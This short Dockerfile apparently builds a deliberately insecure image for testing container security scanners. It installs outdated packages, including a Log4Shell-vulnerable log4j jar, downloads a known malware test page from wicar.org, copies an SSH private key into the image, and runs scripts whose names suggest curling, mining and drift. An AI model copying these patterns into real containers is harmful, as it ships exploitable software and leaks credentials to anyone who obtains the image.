#multi-stage built container
FROM python:3.7-alpine as TheSneaky

WORKDIR /app

RUN pip install requests==2.14.0


FROM ubuntu:14.04 as spooky
COPY --from=TheSneaky /usr/local/lib/python3.7/  /usr/local/lib/python3.5/

WORKDIR /veryMalicious
RUN apt update && apt install curl wget unzip -y

RUN wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.12.1/log4j-core-2.12.1.jar
RUN wget http://malware.wicar.org/data/vlc_amv.html

WORKDIR /verySensetive

COPY ssh_rsa_priv_key .

WORKDIR /veryDangerous

COPY ./scrpts ./

RUN /bin/bash ./i_curl_you.sh &

RUN /bin/bash ./i_mine_you.sh &

CMD ['/bin/bash', './i_drift_you.sh']

